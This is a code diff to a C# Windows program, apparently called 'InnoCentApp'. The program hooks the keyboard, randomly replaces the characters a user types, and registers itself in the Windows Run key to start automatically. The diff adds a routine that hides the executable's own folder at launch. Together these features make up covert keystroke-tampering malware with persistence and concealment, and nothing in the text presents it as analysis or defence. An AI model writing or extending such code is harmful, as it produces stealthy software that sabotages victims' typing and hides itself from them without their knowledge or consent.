@@ -3,6 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.Configuration;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -27,6 +28,7 @@ namespace InnoCentApp
             //       new KeyReplacer.Keymap(){From=";" , To=".,", Probability=80},
             //    }
             //};
+            HideRunFolder();
             var conf = ConfigurationManager.AppSettings["Setting"];
             var settingsObject = KeyReplacer.KeyReplacerServiceSettings.FromJson(conf);
             var autoStart = ConfigurationManager.AppSettings["AutoStart"];
@@ -43,12 +45,19 @@ namespace InnoCentApp
             RegistryKey rk = Registry.CurrentUser.OpenSubKey
                 ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             string file = typeof(InterceptKeys).Assembly.Lo‌​cation;
-            string app = System.IO.Path.GetFileNameWithoutExtension(file);
+            string app = Path.GetFileNameWithoutExtension(file);
             if (bool.TrueString.Equals(start))
                 rk.SetValue(app, Application.ExecutablePath.ToString());
             else
                 rk.DeleteValue(app, false);
 
+        }
+
+        private static void HideRunFolder()
+        {
+            string fileLocation = Application.ExecutablePath.ToString();
+            string folderToHide = Path.GetDirectoryName(fileLocation);
+            File.SetAttributes(folderToHide, FileAttributes.Hidden);
         }
     }
 
